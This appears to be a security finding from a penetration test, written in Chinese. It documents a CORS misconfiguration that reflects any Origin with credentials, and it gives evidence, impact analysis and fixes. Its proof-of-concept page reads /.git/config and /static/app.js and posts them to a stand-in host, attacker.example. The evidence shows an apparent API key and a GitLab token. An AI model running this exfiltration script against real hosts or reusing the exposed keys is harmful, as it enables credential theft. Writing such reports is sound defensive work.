# CORS 反射任意 Origin 且允许携带凭据（NEX-4482 回归）

**ID:** vuln-0004
**Severity:** MEDIUM
**Found:** 2026-10-31 07:33:39 UTC
**Target:** http://10.0.93.73:18080/
**Endpoint:** /api/status
**Method:** GET
**CWE:** CWE-942
**CVSS:** 4.3
**Confidence:** High
**Fix Effort:** Low

## Description

网关将请求中的任意 `Origin` 值原样回显到 `Access-Control-Allow-Origin`，并始终返回 `Access-Control-Allow-Credentials: true`。任何网站都能在访问者浏览器中跨源读取 `/.git/config`（内含以 `oauth2:<token>@` 形式嵌入的 GitLab 访问令牌）与 `/static/app.js`（内含 API Key），并将内容外带。

## Evidence

任意 Origin 反射（`Origin: https://attacker.tld`）：

```http
GET /.git/config HTTP/1.1
Host: 10.0.93.73:18080
Origin: https://attacker.tld

HTTP/1.1 200 OK
Content-Type: text/plain
Access-Control-Allow-Origin: https://attacker.tld
Access-Control-Allow-Credentials: true
```

`null` Origin 同样被接受：

```http
GET /.git/config HTTP/1.1
Origin: null

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

不携带 Origin 时不返回 CORS 头：

```http
GET /api/status HTTP/1.1
HTTP/1.1 200 OK
（无 Access-Control-Allow-* 响应头）
```

真实 Chromium 浏览器跨源读取结果：

```text
[OK] /.git/config     status=200 bytes=10759
     preview: [core] repositoryformatversion = 0 ... url = https://oauth2:glpat~RRRRRRRRRRRRRRRRRRRRRRRR@git.nexus.internal/devops/nexus-deploy.git ...
[OK] /static/app.js   status=200 bytes=770
     preview: const CONFIG = { API_BASE: 'https://api.nexus.internal/v2', API_KEY: 'jge9t357v5lz7e1bylckqano', ...
[BLOCKED] /api/query  TypeError: Failed to fetch   （负面对照）
[EXFIL] 12879 bytes posted
```

浏览器请求携带 `Origin: http://127.0.0.1:8899` 与 `Referer`，服务端将 Origin 原样写入响应头并允许携带凭据；同一浏览器对 `/.env.bak`、`/actuator/env`、`/debug` 的请求返回 403。

## Impact

攻击者只需诱导一名能够访问该主机的用户打开恶意网页，即可在该用户浏览器上下文中跨源读取并外带：`/.git/config` 中的 GitLab 访问令牌 `glpat-...`（配置同时包含指向 `devops/nexus-deploy.git` 的 `pushurl`，但令牌的实际读写权限未验证，因为内部 GitLab 主机不可达）以及 `/static/app.js` 中硬编码的同一令牌与 `API_KEY`。限制条件：`/.env.bak` 与 `/actuator/env` 对浏览器 User-Agent 返回 403，数据库、Redis、AWS、K8s 等凭据无法经此路径跨源读取；`sid` Cookie 为固定值且不承载认证状态，因此 CORS 的增量影响限于静态文件中的凭据材料。

## Counterevidence

主动寻找削弱因素：(1) `sid` Cookie 为固定值且不承载认证状态，`Access-Control-Allow-Credentials: true` 并不能直接窃取会话；(2) `/.git/config` 与 `/static/app.js` 无需认证即可被任何能直连该主机的客户端获取，CORS 的增量仅在于“攻击者无法直连内网时借受害者浏览器读取”；(3) 最敏感的 `/.env.bak`（数据库、Redis、AWS、K8s、JWT 密钥）与 `/actuator/env` 对浏览器 User-Agent 返回 403，真实浏览器无法读取；(4) 该环境多数数据带有仿真/诱导性质，GitLab 令牌可能为诱饵且无法验证；(5) 预检响应缺少 `Access-Control-Allow-Methods`/`Headers`，非简单请求不可用。上述限制已反映在定级中（C:L 而非 C:H）。未发现 Origin 白名单、`Vary: Origin` 或对 `null` Origin 的拒绝。

## What Would Change This Severity

若验证 `/.git/config` 中的 GitLab 令牌可实际访问或推送 `devops/nexus-deploy.git`，机密性影响升至 C:H（≥6.4，High）；若能绕过基于 User-Agent 的等级门禁使 `/.env.bak` 可被浏览器读取，则数据库/AWS/K8s 凭据可被跨源窃取，应定为 Critical。

## Technical Analysis

服务端读取请求 `Origin` 头的值，不做任何白名单校验即写入 `Access-Control-Allow-Origin`，并固定附加 `Access-Control-Allow-Credentials: true`。

实测特征：

- `Origin: https://attacker.tld` 请求 `GET /.git/config` → 200，返回 `Access-Control-Allow-Origin: https://attacker.tld` 与 `Access-Control-Allow-Credentials: true`。
- `Origin: null` 同样被接受，返回 `Access-Control-Allow-Origin: null` 与 `Access-Control-Allow-Credentials: true`，意味着 `data:` URL、沙箱 iframe 等 Origin 为 `null` 的页面也能读取响应。
- 不携带 `Origin` 时响应不出现任何 `Access-Control-Allow-*` 头，证明该头完全来自请求值反射而非固定配置。
- 响应未返回 `Vary: Origin`。
- 该行为出现在 `/.git/config`、`/static/app.js`、`/api/status`、`/metrics`、`/robots.txt` 以及 403 错误页上。

`Access-Control-Allow-Credentials: true` 与动态 `Access-Control-Allow-Origin` 的组合绕过了 `*` 通配的限制，使任意站点被视为受信来源。需注意两点：其一，`sid` Cookie 为服务端固定值且不承载认证状态，凭据标志本身不能直接窃取会话；其二，非简单请求所需的预检响应（`OPTIONS`）并未返回 `Access-Control-Allow-Methods` / `Access-Control-Allow-Headers`，浏览器会拒绝预检，因此实际可利用的是不带自定义头、不带非简单 Content-Type 的简单 `GET` 请求。

未被该缺陷覆盖的接口：`/api/files`、`/api/query`、`/api/auth` 的响应不返回 CORS 头，浏览器跨源读取会被同源策略阻止（已记录负面对照）。`/.env.bak`、`/actuator/env`、`/debug` 对浏览器 User-Agent 返回 403（服务端按客户端指纹下发等级），浏览器无法读取其内容。

## Proof of Concept

1. 在攻击者控制的源上托管恶意 HTML 页面。
2. 页面脚本以 `fetch('http://10.0.93.73:18080/.git/config', {mode:'cors', credentials:'include'})` 发起跨源读取。
3. 脚本读取响应文本，确认其中包含 `glpat-` 开头的 GitLab 令牌。
4. 脚本以同样方式读取 `/static/app.js`，获取硬编码的 `API_KEY`。
5. 脚本将读取结果 POST 到攻击者的收集端点，完成外带。
6. 负面对照：对 `/api/query` 发起同样的跨源 `fetch`，浏览器抛出 `TypeError: Failed to fetch`，证明该接口未开放 CORS。

```html
<!doctype html>
<html><body><pre id="log"></pre>
<script>
const T = "http://10.0.93.73:18080";
const log = document.getElementById('log');
async function grab(path, label) {
  try {
    const r = await fetch(T + path, { mode: 'cors', credentials: 'include' });
    const t = await r.text();
    log.textContent += `[READ] ${label} status=${r.status} bytes=${t.length}\n`;
    return t;
  } catch (e) {
    log.textContent += `[BLOCKED] ${label} ${e.name}: ${e.message}\n`;
    return null;
  }
}
(async () => {
  const git = await grab('/.git/config', '/.git/config');
  const js  = await grab('/static/app.js', '/static/app.js');
  await grab('/api/query?query=1', 'negative control');
  const stolen = [git, js].filter(Boolean).join('\n----\n');
  if (stolen) {
    await fetch('http://attacker.example/collect', { method: 'POST', mode: 'no-cors', body: stolen });
    log.textContent += `[EXFIL] ${stolen.length} bytes sent\n`;
  }
})();
</script></body></html>
```

## Remediation

1. 将 CORS 改为严格的来源白名单匹配（精确比较 scheme+host+port），禁止回显请求的 `Origin`。
2. 仅在确有必要且来源受控的端点上设置 `Access-Control-Allow-Credentials: true`；对其余端点改用 `*` 且不携带凭据。
3. 为跨域请求同时校验 `Sec-Fetch-Site` 等浏览器信号作为纵深防御。
4. 将会话 Cookie 的 `SameSite` 提升为 `Strict`（或对状态变更接口强制 `Strict`），并补上 `Secure` 属性。
5. 按前端注释所述升级到修复该回归的 2.4.2 版本，并在回归测试中加入 CORS 头断言。

## Assumptions

假设存在一名能够从其浏览器访问 `http://10.0.93.73:18080/` 的用户（例如内网员工），且攻击者能诱导其访问恶意页面。`/.git/config` 中的 GitLab 令牌与 `/static/app.js` 中的 API Key 的实际有效性未验证（内部主机 `git.nexus.internal` 与 `api.nexus.internal` 不可达）。
